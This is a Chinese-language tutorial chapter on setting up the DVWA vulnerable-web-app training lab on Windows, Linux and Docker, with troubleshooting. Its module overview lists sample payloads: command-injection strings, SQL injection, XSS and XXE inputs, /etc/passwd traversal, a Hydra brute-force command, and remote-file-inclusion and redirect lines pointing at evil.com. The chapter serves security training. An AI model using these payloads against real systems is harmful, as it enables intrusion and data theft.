# 第3章 DVWA漏洞平台搭建

## 3.1 DVWA概述

DVWA（Damn Vulnerable Web Application）是一个使用PHP/MySQL编写的Web应用漏洞测试平台，包含了多种常见的Web安全漏洞。它是一个专门用于安全学习和测试的合法靶场，旨在为安全爱好者和从业者提供一个实践环境，帮助学习者理解Web漏洞的原理和利用方式。

### 3.1.1 DVWA的特点

- **漏洞类型丰富**：包含SQL注入、XSS、CSRF、文件上传、命令注入等多种常见Web漏洞
- **安全级别可调**：提供Low、Medium、High、Impossible四个安全级别
- **源代码开放**：每个漏洞模块都提供查看源代码功能，便于学习防御方法
- **易于安装**：部署简单，支持手动安装和Docker部署
- **社区活跃**：拥有大量的学习资源和教程
- **免费开源**：完全免费，代码开源在GitHub

### 3.1.2 适用人群

- Web安全初学者
- 渗透测试工程师
- 网络安全学生
- CTF参赛选手
- Web开发人员（学习安全编码）

### 3.1.3 环境要求

| 组件 | 最低版本要求 |
|-----|-----------|
| 操作系统 | Windows/Linux/macOS |
| Web服务器 | Apache/Nginx |
| PHP | 5.4 及以上（推荐PHP 7.x） |
| MySQL | 5.0 及以上 |
| 浏览器 | 任意现代浏览器 |

## 3.2 【Windows环境】PHPStudy搭建DVWA

### 3.2.1 环境准备

Windows环境下推荐使用PHPStudy（小皮面板）搭建DVWA。PHPStudy集成了Apache/Nginx、MySQL、PHP，一键安装即可使用。

### 3.2.2 下载PHPStudy

**操作位置：浏览器**

```
1. 访问官网：https://www.xp.cn/
2. 点击"下载"
3. 选择"Windows版"下载
4. 下载文件：phpStudySetup.exe（约35MB）
```

### 3.2.3 安装PHPStudy

**操作位置：文件资源管理器**

```
1. 双击 phpStudySetup.exe
2. 用户账户控制 -> 选择"是"
3. 许可协议 -> 勾选"我已阅读并同意" -> 安装
4. 选择安装位置：E:\phpStudy（不要安装在C盘）
5. 点击"立即安装"
6. 安装完成 -> 点击"启动"
7. 首次启动会自动安装VC运行库
```

### 3.2.4 启动Web服务

**操作位置：PHPStudy主界面**

```
1. PHPStudy主界面
2. 左侧"环境"菜单
3. 选择"Lnmp"或"Wamp"
   - 推荐选择"Lnmp"（Nginx+MySQL+PHP）
   - 或选择"Wamp"（Apache+MySQL+PHP）
4. 点击"启动"按钮（绿色三角）
5. 状态显示"运行中"表示成功
```

**预期输出：**
```
状态指示灯变为绿色
显示"服务运行中"
```

### 3.2.5 创建网站

**操作位置：PHPStudy主界面 -> 网站**

```
1. 点击"网站" -> "创建网站"
2. 填写配置：
   - 域名：dvwa.test（本地测试用）
   - 端口：80
   - 网站目录：E:\phpStudy\WWW\dvwa
   - PHP版本：选择7.x或8.x（DVWA推荐PHP 7.x）
3. 点击"确认"
```

### 3.2.6 下载DVWA

**操作位置：命令行（PowerShell）**

```powershell
# 方法1：Git克隆（需要Git）
cd E:\phpStudy\WWW
git clone https://github.com/digininja/DVWA.git

# 方法2：直接下载ZIP
# 访问 https://github.com/digininja/DVWA/releases
# 下载最新版本的 Source code (zip)
# 解压到 E:\phpStudy\WWW\dvwa
```

**预期输出（Git克隆）：**
```
Cloning into 'DVWA'...
remote: Enumerating objects: 3124, done.
Receiving objects: 100% (3124/3124), 7.87 MiB | 8.50 MiB/s, done.
Resolving deltas: 100% (1680/1680), done.
```

### 3.2.7 配置DVWA

**操作位置：文件资源管理器 -> DVWA配置目录**

```bash
# 1. 进入DVWA目录
cd E:\phpStudy\WWW\dvwa

# 2. 复制配置文件
copy config.inc.php.dist config.inc.php

# 3. 编辑配置文件
# 用记事本或其他编辑器打开 config.inc.php
```

**操作位置：config.inc.php文件**

修改数据库配置（约第17-21行）：

```php
$_DVWA = array();
$_DVWA[ 'db_server' ]   = '127.0.0.1';
$_DVWA[ 'db_database' ] = 'dvwa';
$_DVWA[ 'db_user' ]     = 'root';
$_DVWA[ 'db_password' ] = 'root';  # 修改这里

# PHPStudy默认MySQL密码是 root（如果没有修改过）
# 如果修改过密码，请填写实际密码
```

**找回/重置MySQL密码方法：**
```
1. PHPStudy界面 -> 数据库
2. 点击"root"用户的"管理"
3. phpMyAdmin界面 -> 用户账户
4. 修改root@localhost的密码
```

配置reCAPTCHA（可选，跳过也不影响使用）：

```php
$_DVWA[ 'recaptcha_public_key' ]  = '';
$_DVWA[ 'recaptcha_private_key' ] = '';
```

### 3.2.8 创建数据库

**操作位置：浏览器**

```bash
# 方法1：自动创建（推荐）
# 访问 http://dvwa.test/setup.php
# 浏览器会自动提示创建数据库
# 点击页面下方的 "Create / Reset Database" 按钮

# 方法2：手动创建（phpMyAdmin）
# 1. 访问 http://127.0.0.1/phpinfo.php 或通过PHPStudy打开phpMyAdmin
# 2. 点击"数据库"
# 3. 创建数据库：dvwa，排序规则：utf8_general_ci
# 4. 导入 dvwa.sql 文件
```

### 3.2.9 验证安装

**操作位置：浏览器**

```bash
# 1. 打开浏览器访问
http://dvwa.test/setup.php

# 2. 页面应该显示DVWA Setup页面
# 3. 绿色√表示配置正确
# 4. 点击最下方的 "Create / Reset Database" 按钮
# 5. 成功后会跳转到登录页面 http://dvwa.test/login.php

# 6. 默认登录凭据：
#    用户名：admin
#    密码：password
```

### 3.2.10 关闭PHPStudy安全限制

**操作位置：PHPStudy -> 设置 -> 配置文件**

```php
# 在 php.ini 文件中（通过PHPStudy"设置"->"配置文件"找到）
# 找到以下配置并修改：

# 允许URL包含文件
allow_url_include = On

# 关闭PHP安全模式（某些版本）
safe_mode = Off

# 关闭magic quotes（老版本DVWA可能需要）
magic_quotes_gpc = Off
```

**PHPStudy修改方法：**
```
1. PHPStudy界面 -> 设置 -> 配置文件
2. 选择对应PHP版本的 php.ini
3. Ctrl+F搜索上述配置项
4. 修改后保存，重启服务
```

## 3.3 【Linux环境】LAMP搭建DVWA

### 3.3.1 更新系统

**操作位置：终端**

```bash
sudo apt update
sudo apt upgrade -y
```

**预期输出：**
```
Hit:1 http://mirrors.aliyun.com/ubuntu jammy InRelease
Reading package lists... Done
Building dependency tree... Done
Calculation of upgrade... Done
```

### 3.3.2 安装LAMP

**操作位置：终端**

```bash
# 安装Apache、MySQL、PHP及相关软件包
sudo apt install -y apache2 \
  mysql-server \
  php \
  php-mysql \
  php-gd \
  php-mbstring \
  php-xml \
  php-curl \
  libapache2-mod-php
```

**安装过程中会提示设置MySQL root密码**
**设置密码（如：DVWA@2024）**

**预期输出：**
```
Setting up mysql-server-8.0 ...
Setting up apache2 ...
Setting up php8.1 ...
Processing triggers for systemd ...
```

### 3.3.3 启动服务

**操作位置：终端**

```bash
# 启动Apache和MySQL
sudo systemctl start apache2
sudo systemctl start mysql

# 设置开机自启
sudo systemctl enable apache2
sudo systemctl enable mysql

# 验证服务状态
sudo systemctl status apache2
sudo systemctl status mysql
```

**预期输出：**
```
● apache2.service - The Apache HTTP Server
   Active: active (running) since Wed 2024-01-01 00:00:00 CST; 1min ago

● mysql.service - MySQL Community Server
   Active: active (running) since Wed 2024-01-01 00:00:00 CST; 1min ago
```

### 3.3.4 下载DVWA

**操作位置：终端**

```bash
cd /var/www/html
sudo git clone https://github.com/digininja/DVWA.git
sudo chmod -R 755 /var/www/html/DVWA
sudo chown -R www-data:www-data /var/www/html/DVWA
```

**预期输出：**
```
Cloning into '/var/www/html/DVWA'...
remote: Enumerating objects: 3124, done.
Receiving objects: 100% (3124/3124), 7.87 MiB | 10.00 MiB/s, done.
Resolving deltas: 100% (1680/1680), done.
```

### 3.3.5 配置DVWA

**操作位置：终端**

```bash
cd /var/www/html/DVWA/config

# 复制配置文件
sudo cp config.inc.php.dist config.inc.php

# 编辑配置
sudo nano config.inc.php
```

修改数据库配置：

```php
# 修改数据库配置
$_DVWA[ 'db_server' ]   = '127.0.0.1';
$_DVWA[ 'db_database' ] = 'dvwa';
$_DVWA[ 'db_user' ]     = 'root';
$_DVWA[ 'db_password' ] = 'DVWA@2024';  # 你设置的MySQL密码

# 保存退出：Ctrl+X -> Y -> Enter
```

### 3.3.6 配置PHP

**操作位置：终端**

```bash
# 编辑PHP配置
sudo nano /etc/php/*/apache2/php.ini
# * 表示PHP版本号，如8.1

# 查找并修改以下配置
allow_url_include = On
```

**查找方法：Ctrl+W -> 输入关键词 -> Enter**

### 3.3.7 创建数据库

**操作位置：终端**

```bash
sudo mysql -u root -pDVWA@2024 << EOF
CREATE DATABASE dvwa CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;
SHOW DATABASES;
EXIT
EOF
```

**预期输出：**
```
Database
information_schema
dvwa
mysql
performance_schema
sys
```

### 3.3.8 设置DVWA目录权限

**操作位置：终端**

```bash
# DVWA需要写入特定目录
sudo chmod 755 /var/www/html/DVWA/hackable/uploads
sudo chmod 755 /var/www/html/DVWA/external/phpids/lib/Cache
```

### 3.3.9 访问DVWA

**操作位置：浏览器**

```bash
# 在浏览器访问
http://localhost/DVWA/setup.php
# 或
http://你的IP/DVWA/setup.php

# 点击 "Create / Reset Database"
# 成功后访问 http://localhost/DVWA/login.php
```

## 3.4 【Docker】方式搭建DVWA

### 3.4.1 安装Docker

参考第1章Docker安装部分。

### 3.4.2 拉取/运行DVWA

**操作位置：终端**

```bash
# 方式1：使用Docker Hub官方镜像
docker run --name dvwa -d -p 80:80 vulnerables/dvwa

# 方式2：使用docker-compose（推荐，便于管理）
mkdir dvwa && cd dvwa
nano docker-compose.yml
```

**预期输出：**
```
Unable to find image 'vulnerables/dvwa:latest' locally
latest: Pulling from vulnerables/dvwa
...
1a2b3c4d5e6f: Pull complete
...
```

### 3.4.3 Docker Compose方式（推荐）

**操作位置：终端**

创建`docker-compose.yml`文件：

```yaml
version: '3'
services:
  dvwa:
    image: vulnerabilities/dvwa:latest
    container_name: dvwa
    ports:
      - "8080:80"
    environment:
      - MYSQL_HOSTNAME=dvwa-db
      - MYSQL_DATABASE=dvwa
      - MYSQL_USER=dvwa
      - MYSQL_PASSWORD=dvwa
    depends_on:
      - dvwa-db
    restart: unless-stopped

  dvwa-db:
    image: mysql:5.7
    container_name: dvwa-mysql
    environment:
      - MYSQL_ROOT_PASSWORD=dvwa
      - MYSQL_DATABASE=dvwa
      - MYSQL_USER=dvwa
      - MYSQL_PASSWORD=dvwa
    volumes:
      - dvwa-db-data:/var/lib/mysql
    restart: unless-stopped

volumes:
  dvwa-db-data:
```

### 3.4.4 启动容器

**操作位置：终端**

```bash
# 启动
docker-compose up -d

# 查看运行状态
docker-compose ps

# 查看日志
docker-compose logs -f
```

**预期输出：**
```
[+] Running 2/2
 ✔ Network dvwa_default    Created
 ✔ Container dvwa-mysql    Started
 ✔ Container dvwa          Started
```

### 3.4.5 访问DVWA

**操作位置：浏览器**

```
# 浏览器打开 http://localhost:8080/setup.php
# 或 http://你的IP:8080/setup.php

# 点击 "Create / Reset Database" 初始化数据库
```

## 3.5 DVWA界面与安全级别设置

### 3.5.1 界面介绍

登录DVWA后，主界面分为几个部分：

1. **左侧菜单**：左侧是各个漏洞模块
2. **顶部导航**：主页、说明、PHP信息、安全级别、帮助、关于
3. **主内容区**：显示当前选中模块的内容
4. **底部信息**：安全级别、提示、查看源代码等功能按钮

### 3.5.2 安全级别设置

**操作位置：DVWA页面**

DVWA提供四个安全级别：

| 级别 | 说明 |
|-----|------|
| **Low** | 最低安全级别，没有任何防护，漏洞最容易利用 |
| **Medium** | 中等安全级别，有一些基础防护，但仍然存在漏洞 |
| **High** | 高安全级别，防护更完善，需要更高级的利用技巧 |
| **Impossible** | 不可能级别，理论上不存在漏洞，用于对比学习 |

**修改安全级别：**

```
1. 点击左侧菜单的"DVWA Security"
2. 选择安全级别
3. 点击"Submit"提交
```

> 建议学习顺序：从Low级别开始，理解漏洞原理后逐步提高难度。

### 3.5.3 其他设置页面功能

每个漏洞模块页面通常包含以下功能按钮：

- **View Source**：查看当前页面的源代码
- **View Help**：查看帮助提示
- **User ID**：当前用户ID信息

## 3.6 漏洞模块介绍

### 3.6.1 Brute Force（暴力破解）

**功能说明**：模拟登录页面的暴力破解测试。

**Low级别**：没有任何防护，可以直接使用Hydra、Burp Suite等工具进行暴力破解。

**测试方法**：

```bash
# 使用Hydra暴力破解
hydra -l admin -P passwords.txt localhost http-post-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect"
```

**Medium级别**：增加了简单的延时防护。

**High级别**：增加了token机制，需要先获取token。

### 3.6.2 Command Injection（命令注入）

**功能说明**：通过操作系统命令执行漏洞，执行任意系统命令。

**Low级别**：没有过滤，直接拼接命令。

**测试Payload**：
```
127.0.0.1; whoami
127.0.0.1 && ls
127.0.0.1 | id
```

**Medium级别**：过滤了部分字符。

**High级别**：更严格的过滤，但仍有绕过可能。

### 3.6.3 CSRF（跨站请求伪造）

**功能说明**：修改用户密码的CSRF漏洞。

**Low级别**：没有验证请求来源。

**利用方法**：构造恶意页面，诱导管理员访问后修改密码。

**Medium级别**：检查Referer头。

**High级别**：增加了token验证。

### 3.6.4 File Inclusion（文件包含）

**功能说明**：文件包含漏洞，分为本地文件包含（LFI）和远程文件包含（RFI）。

**Low级别**：没有过滤，可以包含任意文件。

**本地文件包含测试**：
```
../../../../etc/passwd
```

**远程文件包含测试**（需要allow_url_include开启）：
```
http://evil.com/shell.txt
```

**Medium级别**：过滤了http等协议前缀。

**High级别**：限制文件包含路径限制。

### 3.6.5 File Upload（文件上传）

**功能说明**：文件上传漏洞，上传恶意文件获取WebShell。

**Low级别**：没有任何验证，直接上传PHP文件。

**测试步骤**：
1. 准备一个PHP一句话木马
2. 上传文件
3. 访问上传的文件
4. 获取WebShell

**Medium级别**：检查文件类型MIME type。

**High级别**：检查文件扩展名和内容。

### 3.6.6 SQL Injection（SQL注入）

**功能说明**：SQL注入漏洞，最经典的Web漏洞之一。

**Low级别**：没有过滤，直接拼接SQL语句。

**测试方法**：
```
1' OR '1'='1
1' UNION SELECT 1,2-- -
```

**常用测试步骤：**
1. 判断注入点
2. 判断字段数
3. 获取数据库名
4. 获取表名
5. 获取列名
6. 获取数据

**Medium级别**：使用了mysql_real_escape_string，但仍有风险。

**High级别**：限制了查询输出信息更严格。

### 3.6.7 SQL Injection (Blind)（SQL盲注）

**功能说明**：SQL盲注，页面没有回显，需要通过布尔或延时判断。

**类型**：
- 布尔盲注：根据页面返回是否正确判断
- 时间盲注：根据页面延时判断

**Low级别**：没有任何防护。

**测试方法**：
```
1' AND SLEEP(5)-- -
1' AND LENGTH(DATABASE())>5-- -
```

### 3.6.8 XSS (Reflected)（反射型XSS）

**功能说明**：反射型跨站脚本攻击。

**Low级别**：没有过滤。

**测试Payload**：
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
```

**Medium级别**：过滤了`<script>`标签。

**High级别**：更严格的过滤。

### 3.6.9 XSS (Stored)（存储型XSS）

**功能说明**：存储型跨站脚本攻击，Payload存储在数据库中。

**Low级别**：没有过滤，直接存储到数据库。

**测试方法**：
1. 在留言板输入XSS Payload
2. 提交后Payload存储
3. 访问页面触发XSS

**Medium级别**：部分过滤。

**High级别**：更严格过滤。

### 3.6.10 XSS (DOM)（DOM型XSS）

**功能说明**：DOM型跨站脚本攻击，基于DOM的XSS。

**Low级别**：没有过滤。

**测试Payload**：
```
#<script>alert('XSS')</script>
```

### 3.6.11 CSP Bypass（内容安全策略绕过）

**功能说明**：内容安全策略（CSP）绕过测试。

学习如何绕过各种CSP策略。

### 3.6.12 JavaScript（JavaScript）

**功能说明**：JavaScript前端验证绕过。

学习前端验证的安全性问题。

### 3.6.13 XXE（XML外部实体注入）

**功能说明**：XML外部实体注入漏洞。

**Low级别**：没有过滤XXE。

**测试Payload**：
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### 3.6.14 Insecure CAPTCHA（不安全的验证码）

**功能说明**：不安全的验证码机制。

学习验证码绕过技术。

### 3.6.15 Open HTTP Redirect（开放重定向）

**功能说明**：开放重定向漏洞。

**测试方法**：
```
?redirect=http://evil.com
```

## 3.7 常见问题与排错

### 3.7.1 【Windows环境】常见问题

**问题1：数据库连接失败**

**操作位置：浏览器 + PHPStudy**

解决步骤：
```
1. 检查MySQL服务是否启动（PHPStudy界面查看状态）
2. 检查config.inc.php中的数据库凭据
   - 用户名是否为root
   - 密码是否与PHPStudy一致（默认root）
3. 确认数据库已创建（访问setup.php时会自动创建）
4. 检查phpMyAdmin中能否连接
```

**问题2：页面显示"Access denied"**

解决步骤：
```
1. 检查DVWA目录权限：确保IIS/Apache有读取权限
2. 检查php.ini的allow_url_include设置是否为On
3. 清除浏览器缓存
4. 以管理员身份运行PHPStudy
```

**问题3：无法创建数据库**

解决步骤：
```
1. 手动在phpMyAdmin中创建dvwa数据库
2. 导入config/create.sql文件
3. 检查MySQL用户权限
```

**问题4：PHPStudy启动失败**

解决步骤：
```
1. 检查端口是否被占用（80端口可能被IIS占用）
2. 关闭IIS服务：Win+R -> services.msc -> 停止World Wide Web Publishing Service
3. 检查VC运行库是否安装完整
4. 尝试以管理员身份运行PHPStudy
```

### 3.7.2 【Linux环境】常见问题

**问题1：数据库连接失败**

**操作位置：终端**

解决步骤：
```bash
# 1. 检查MySQL服务状态
sudo systemctl status mysql

# 2. 检查MySQL root密码
sudo mysql -u root -p你的密码

# 3. 检查config.inc.php配置
sudo nano /var/www/html/DVWA/config/config.inc.php

# 4. 重启MySQL服务
sudo systemctl restart mysql
```

**问题2：页面显示空白或报错**

解决步骤：
```bash
# 1. 检查Apache错误日志
sudo tail -f /var/log/apache2/error.log

# 2. 检查PHP错误日志
sudo tail -f /var/log/apache2/error.log

# 3. 检查文件权限
sudo chmod -R 755 /var/www/html/DVWA/
sudo chown -R www-data:www-data /var/www/html/DVWA/

# 4. 重启Apache
sudo systemctl restart apache2
```

**问题3：reCAPTCHA key缺失警告**

解决步骤：
```
1. 访问 https://www.google.com/recaptcha/admin/create
2. 选择V2复选框
3. 输入域名（如：localhost）
4. 获取Site Key和Secret Key
5. 填入config.inc.php
```

### 3.7.3 【Docker】常见问题

**问题1：Docker容器启动失败**

**操作位置：终端**

解决步骤：
```bash
# 1. 检查端口是否被占用
netstat -an | grep 8080

# 2. 查看容器日志
docker logs dvwa

# 3. 检查Docker服务状态
sudo systemctl status docker

# 4. 重新创建容器
docker-compose down
docker-compose up -d
```

**问题2：数据库连接失败（Docker方式）**

解决步骤：
```bash
# 1. 检查MySQL容器状态
docker ps -a

# 2. 查看MySQL容器日志
docker logs dvwa-mysql

# 3. 进入MySQL容器测试连接
docker exec -it dvwa-mysql mysql -u dvwa -pdvwa

# 4. 等待MySQL完全启动后再访问DVWA
```

**问题3：忘记初始化数据库**

解决步骤：
```
1. 等待容器完全启动（约30秒）
2. 刷新页面 http://localhost:8080/setup.php
3. 点击 "Create / Reset Database"
4. 如果仍失败，重启容器：
   docker-compose restart
```

### 3.7.4 通用问题

**问题1：文件上传后找不到上传的文件？**

解决步骤：
```
1. 上传的文件通常在hackable/uploads/目录下
2. 检查目录权限：chmod 755 hackable/uploads/
3. 检查Apache/Nginx用户是否有写入权限
```

**问题2：命令注入不能用？**

解决步骤：
```
1. 确认PHP的exec、system、shell_exec等函数是否开启
2. 确认当前安全级别
3. 确认命令语法正确
4. 检查php.ini中的disable_functions配置
```

**问题3：SQL注入不生效？**

解决步骤：
```
1. 检查安全级别（确认不是Impossible）
2. 检查Cookie中的security设置
3. 使用Burp Suite抓包确认参数
4. 确认数据库连接正常
```

## 3.8 本章小结

本章详细介绍了DVWA漏洞平台的搭建和使用方法，主要内容包括：

1. **DVWA概述**：了解DVWA的特点、适用人群和环境要求
2. **Windows环境搭建**：使用PHPStudy在Windows下完整安装配置DVWA
3. **Linux环境搭建**：使用LAMP在Linux下完整安装配置DVWA
4. **Docker部署**：使用Docker快速部署DVWA环境
5. **界面与安全级别**：界面介绍和四个安全级别的使用方法
6. **漏洞模块介绍**：十多个漏洞模块的功能和基本测试方法
7. **常见问题排错**：各环境下安装和使用过程中常见问题的解决方法

DVWA是Web安全入门的经典靶场，建议读者从Low级别开始，逐个模块逐个模块学习，理解每个漏洞的原理和利用方式，然后逐步提高难度，最后对比Impossible级别的防护代码，学习如何防范这些漏洞。下一章我们将学习SQL注入专用靶场SQLi-Labs的搭建。
